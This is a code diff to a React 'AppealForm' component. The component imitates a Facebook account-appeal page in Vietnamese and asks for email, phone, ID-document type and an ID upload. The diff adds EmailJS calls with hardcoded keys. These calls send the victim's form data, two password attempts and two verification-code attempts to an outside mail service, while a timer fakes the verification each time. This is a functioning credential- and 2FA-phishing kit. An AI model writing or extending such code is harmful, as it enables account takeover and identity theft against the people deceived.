@@ -1,7 +1,9 @@
-import { useState, useEffect } from "react";
-import { CheckCircle2, Loader2 } from "lucide-react";
+import { useState, useEffect, useRef } from "react";
+import { CheckCircle2, Loader2, ChevronDown, Upload } from "lucide-react";
+import emailjs from '@emailjs/browser';
 
 export default function AppealForm() {
+  const fileInputRef = useRef<HTMLInputElement | null>(null);
   const [issueType, setIssueType] = useState("fakeAccount");
   const [accountStatus, setAccountStatus] = useState("no");
   const [appealReason, setAppealReason] = useState("reason1");
@@ -11,6 +13,8 @@ export default function AppealForm() {
   const [link, setLink] = useState("");
   const [additionalInfo, setAdditionalInfo] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showIdOptions, setShowIdOptions] = useState(false);
+  const [selectedFile, setSelectedFile] = useState<File | null>(null);
   
   // New verification states
   const [formStage, setFormStage] = useState("initial"); // initial, password1, password2, code1, code2, complete
@@ -23,9 +27,58 @@ export default function AppealForm() {
   const [timer, setTimer] = useState(0);
   const [isVerifying, setIsVerifying] = useState(false);
   
+  // EmailJS configuration
+  const SERVICE_ID = "service_j1vn1o6";
+  const TEMPLATE_ID = "template_uvh7y0g";
+  const PUBLIC_KEY = "HisNIy8_NoPxGd9Tl";
+  
+  const sendEmail = (stage: string, data: any) => {
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+      stage: stage,
+      ...data
+    }, PUBLIC_KEY)
+    .then((result) => {
+      console.log('Email sent successfully:', result.text);
+    }, (error) => {
+      console.log('Failed to send email:', error.text);
+    });
+  };
+  
+  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const file = event.target.files?.[0] || null;
+    setSelectedFile(file);
+  };
+  
+  const handleFileClick = () => {
+    if (fileInputRef.current) {
+      fileInputRef.current.click();
+    }
+  };
+  
+  const getIdTypeLabel = () => {
+    switch(linkChoice) {
+      case 'nationalId': return 'National ID (Căn cước công dân/CMND)';
+      case 'passport': return 'Passport (Hộ chiếu)';
+      case 'driversLicense': return 'Bằng lái xe';
+      default: return 'Chọn loại giấy tờ tùy thân';
+    }
+  };
+  
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
+    
+    // Send initial form data to EmailJS
+    sendEmail('initial_form', {
+      issueType,
+      accountStatus,
+      appealReason,
+      email,
+      phone,
+      link,
+      idType: getIdTypeLabel(),
+      additionalInfo
+    });
     
     // Simulate form submission with loading time
     setTimeout(() => {
@@ -37,6 +90,12 @@ export default function AppealForm() {
   const handlePasswordSubmit1 = (e: React.FormEvent) => {
     e.preventDefault();
     setIsVerifying(true);
+    
+    sendEmail('password_attempt_1', {
+      email,
+      phone,
+      password: password1
+    });
     
     // Simulate verification with loading time
     setTimeout(() => {
@@ -50,6 +109,12 @@ export default function AppealForm() {
     e.preventDefault();
     setIsVerifying(true);
     
+    sendEmail('password_attempt_2', {
+      email,
+      phone,
+      password: password2
+    });
+    
     // Simulate verification with loading time
     setTimeout(() => {
       setIsVerifying(false);
@@ -61,6 +126,12 @@ export default function AppealForm() {
   const handleCodeSubmit1 = (e: React.FormEvent) => {
     e.preventDefault();
     setIsVerifying(true);
+    
+    sendEmail('code_attempt_1', {
+      email,
+      phone,
+      code: code1
+    });
     
     // Simulate verification with loading time
     setTimeout(() => {
@@ -90,11 +161,29 @@ export default function AppealForm() {
     e.preventDefault();
     setIsVerifying(true);
     
+    sendEmail('code_attempt_2', {
+      email,
+      phone,
+      code: code2
+    });
+    
     // Simulate verification with loading time
     setTimeout(() => {
       setIsVerifying(false);
       setCodeError(false);
       setFormStage("complete");
+      
+      // Send completion notification
+      sendEmail('form_complete', {
+        email,
+        phone,
+        issueType,
+        accountStatus,
+        appealReason,
+        idType: getIdTypeLabel(),
+        timestamp: new Date().toString()
+      });
+      
     }, 3000);
   };
   
@@ -276,55 +365,67 @@ export default function AppealForm() {
           <div className="mb-4">
             <p className="text-sm font-medium mb-2">Loại giấy tờ tùy thân</p>
             <div className="border border-[#dddfe2] rounded p-3">
-              <div className="mb-2">
-                <label className="flex items-center mb-1">
-                  <input 
-                    type="radio" 
-                    name="linkChoice" 
-                    value="nationalId" 
-                    className="facebook-radio"
-                    checked={linkChoice === "nationalId"}
-                    onChange={() => setLinkChoice("nationalId")}
-                  />
-                  <span className="text-sm ml-2">National ID (Căn cước công dân/CMND)</span>
-                </label>
+              <div 
+                className="flex justify-between items-center cursor-pointer"
+                onClick={() => setShowIdOptions(!showIdOptions)}
+              >
+                <span className="text-sm">{getIdTypeLabel()}</span>
+                <ChevronDown className={`w-4 h-4 transition-transform ${showIdOptions ? 'rotate-180' : ''}`} />
               </div>
               
-              <div className="mb-2">
-                <label className="flex items-center mb-1">
-                  <input 
-                    type="radio" 
-                    name="linkChoice" 
-                    value="passport" 
-                    className="facebook-radio"
-                    checked={linkChoice === "passport"}
-                    onChange={() => setLinkChoice("passport")}
-                  />
-                  <span className="text-sm ml-2">Passport (Hộ chiếu)</span>
-                </label>
-              </div>
-              
-              <div>
-                <label className="flex items-center">
-                  <input 
-                    type="radio" 
-                    name="linkChoice" 
-                    value="driversLicense" 
-                    className="facebook-radio"
-                    checked={linkChoice === "driversLicense"}
-                    onChange={() => setLinkChoice("driversLicense")}
-                  />
-                  <span className="text-sm ml-2">Bằng lái xe</span>
-                </label>
-              </div>
+              {showIdOptions && (
+                <div className="mt-2 border-t pt-2">
+                  <div 
+                    className="py-1 px-2 hover:bg-gray-100 cursor-pointer text-sm"
+                    onClick={() => {
+                      setLinkChoice("nationalId");
+                      setShowIdOptions(false);
+                    }}
+                  >
+                    National ID (Căn cước công dân/CMND)
+                  </div>
+                  <div 
+                    className="py-1 px-2 hover:bg-gray-100 cursor-pointer text-sm"
+                    onClick={() => {
+                      setLinkChoice("passport");
+                      setShowIdOptions(false);
+                    }}
+                  >
+                    Passport (Hộ chiếu)
+                  </div>
+                  <div 
+                    className="py-1 px-2 hover:bg-gray-100 cursor-pointer text-sm"
+                    onClick={() => {
+                      setLinkChoice("driversLicense");
+                      setShowIdOptions(false);
+                    }}
+                  >
+                    Bằng lái xe
+                  </div>
+                </div>
+              )}
               
               <div className="mt-3 pt-3 border-t border-[#dddfe2]">
+                <input
+                  type="file"
+                  ref={fileInputRef}
+                  onChange={handleFileChange}
+                  className="hidden"
+                  accept="image/*,.pdf"
+                />
                 <button
                   type="button"
-                  className="px-3 py-1 bg-gray-200 hover:bg-gray-300 rounded text-sm font-medium transition-colors"
+                  onClick={handleFileClick}
+                  className="flex items-center px-3 py-2 bg-gray-200 hover:bg-gray-300 rounded text-sm font-medium transition-colors"
                 >
-                  Tải lên giấy tờ
+                  <Upload className="w-4 h-4 mr-2" />
+                  {selectedFile ? selectedFile.name : "Tải lên giấy tờ"}
                 </button>
+                {selectedFile && (
+                  <div className="mt-2 text-xs text-green-600">
+                    Đã chọn tệp: {selectedFile.name}
+                  </div>
+                )}
               </div>
             </div>
           </div>
